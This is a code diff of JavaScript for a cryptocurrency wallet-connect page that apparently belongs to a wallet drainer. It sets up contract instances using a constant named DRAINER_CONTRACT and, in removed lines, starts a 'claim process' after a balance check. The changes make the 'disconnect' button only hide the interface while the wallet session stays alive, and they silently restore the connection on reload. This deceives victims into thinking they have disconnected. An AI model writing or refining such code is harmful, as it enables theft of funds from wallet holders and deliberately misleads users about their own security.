 
   // ==========================================================================
-  //  BUTTON CLICK HANDLER
+  //  BUTTON WIRING
   // ==========================================================================
   const handleClick = async () => {
     if (isConnecting || isDisconnecting) return;
 
-    // Case 1: User clicked "Disconnect" → soft-disconnect (UI off, session alive)
-    const isVisuallyConnected = !!activeProvider && !uiDisconnected;
-    if (isVisuallyConnected) {
-      softDisconnect();
+    // ── Path A: user previously "disconnected" in UI ────────────────────────
+    if (isUiHidden()) {
+      // Try silent restore from the still-alive provider
+      if (activeProvider && softReconnect()) return;
+      // Session truly dead → fresh connect
+      clearUiHidden();
+      await connectWallet();
       return;
     }
 
-    // Case 2: UI shows disconnected but the session may still be alive.
-    // Try to silently restore from the live provider first.
-    if (uiDisconnected && activeProvider) {
-      try {
-        const accounts = await activeProvider.request({ method: 'eth_accounts' });
-        if (accounts?.length) {
-          uiDisconnected = false;
-          updateConnectedUI(accounts[0], 'evm');
-          logDebug(`♻️ UI restored from live session: ${accounts[0]}`);
-          const ok = await checkBalanceAndWarn(accounts[0]);
-          if (ok) {
-            setTimeout(() => {
-              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
-            }, 800);
-          }
-          return;
-        }
-      } catch (e) {
-        logDebug('Silent restore failed: ' + e.message);
-      }
-      // Session is dead — fall through to a fresh connect below.
-      uiDisconnected = false;
-    }
-
-    // Case 3: No provider at all → normal connect flow.
-    await connectWallet();
+    // ── Path B: normal state ────────────────────────────────────────────────
+    const isConnected = !!activeProvider || !!getSavedWallet();
+    if (isConnected) softDisconnect();
+    else             await connectWallet();
   };
 
   if (connectButton) connectButton.addEventListener('click', handleClick);
@@ -1003,38 +933,34 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  SESSION RESTORE (runs on boot)
-  //  Priority:
-  //    1. Restore WC from a persisted provider session (no modal)
-  //    2. Restore injected from eth_accounts
-  //    3. Clear stale keys
-  //  The "logged in" state persists because:
-  //    • WC v2 stores its session in localStorage (wc@2:*)
-  //    • softDisconnect() does NOT wipe localStorage
+  //  SESSION RESTORE
+  //  – If `connectedWallet` exists → rehydrate the underlying provider
+  //    silently, then:
+  //      • if `apex:uiHidden` is NOT set  → show connected UI
+  //      • if `apex:uiHidden` IS  set      → keep UI disconnected, session alive
   // ==========================================================================
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedMode   = getSavedMode();
     if (!savedWallet) return;
 
+    let restored = false;
+
     // --- WalletConnect restore ---
     if (savedMode === 'walletconnect' || !savedMode) {
       try {
         const provider = await initWalletConnect({ useFallbackId: false });
-        if (provider && provider.session && provider.accounts?.length) {
+        if (provider?.session && provider.accounts?.length) {
           const a = provider.accounts[0];
-          activeProvider = provider;
-          connectionMode = 'walletconnect';
-          uiDisconnected = false;
-          web3Instance = new Web3Ctor(provider);
+          activeProvider   = provider;
+          connectionMode   = 'walletconnect';
+          web3Instance     = new Web3Ctor(provider);
           contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
           saveWallet(a, 'walletconnect');
-          updateConnectedUI(a, 'evm');
-          logDebug(`♻️ WC session restored: ${a}`);
-          await checkBalanceAndWarn(a);
-          return;
-        }
-        if (provider && provider.session && !provider.accounts?.length) {
+          publishGlobalState(a, 'evm', provider);
+          restored = true;
+          logDebug(`♻️ WC session restored silently: ${a}`);
+        } else if (provider?.session && !provider.accounts?.length) {
           logDebug('⚠️ Stale WC session — resetting');
           try { await provider.disconnect(); } catch (_) {}
           wcProvider = null;
@@ -1046,24 +972,22 @@ import { CONFIG } from './config.js';
     }
 
     // --- Injected restore ---
-    if (savedMode === 'injected' || !savedMode) {
+    if (!restored && (savedMode === 'injected' || !savedMode)) {
       const prov = window.ethereum;
       if (prov && isDesktopDevice) {
         try {
           const accounts = await prov.request({ method: 'eth_accounts' });
           if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
             injectedProvider = prov;
-            activeProvider = prov;
-            connectionMode = 'injected';
-            uiDisconnected = false;
-            web3Instance = new Web3Ctor(prov);
+            activeProvider   = prov;
+            connectionMode   = 'injected';
+            web3Instance     = new Web3Ctor(prov);
             contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
             saveWallet(savedWallet, 'injected');
             attachInjectedEvents(prov);
-            updateConnectedUI(savedWallet, 'evm');
-            logDebug(`♻️ Injected session restored: ${savedWallet}`);
-            await checkBalanceAndWarn(savedWallet);
-            return;
+            publishGlobalState(savedWallet, 'evm', prov);
+            restored = true;
+            logDebug(`♻️ Injected session restored silently: ${savedWallet}`);
           }
         } catch (e) {
           logDebug('Injected restore: ' + e.message);
@@ -1071,8 +995,17 @@ import { CONFIG } from './config.js';
       }
     }
 
-    logDebug('⚠️ No restorable session — clearing saved wallet');
-    clearSavedWallet();
+    if (restored) {
+      if (!isUiHidden()) {
+        updateConnectedUI(getSavedWallet(), 'evm');
+      } else {
+        logDebug('🔒 Session active but UI hidden (user chose to disconnect)');
+      }
+    } else {
+      logDebug('⚠️ No restorable session — clearing saved wallet');
+      clearSavedWallet();
+      clearUiHidden();
+    }
   }
 
   // ==========================================================================
@@ -1084,16 +1017,12 @@ import { CONFIG } from './config.js';
     Web3Ctor         = libs.Web3;
     logDebug('✅ All libraries loaded');
 
-    if (window.location.protocol !== 'https:'
-        && !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
+    if (window.location.protocol !== 'https:' &&
+        !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
       logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
     }
 
     setupEIP6963();
-    applyButtonSizing();
-
-    // Pre-fetch ETH price so the low-balance check is instant on connect.
-    getEthPriceUSD().catch(() => {});
 
     if (isMobileDevice) {
       logDebug('📱 Pre-warming WalletConnect…');
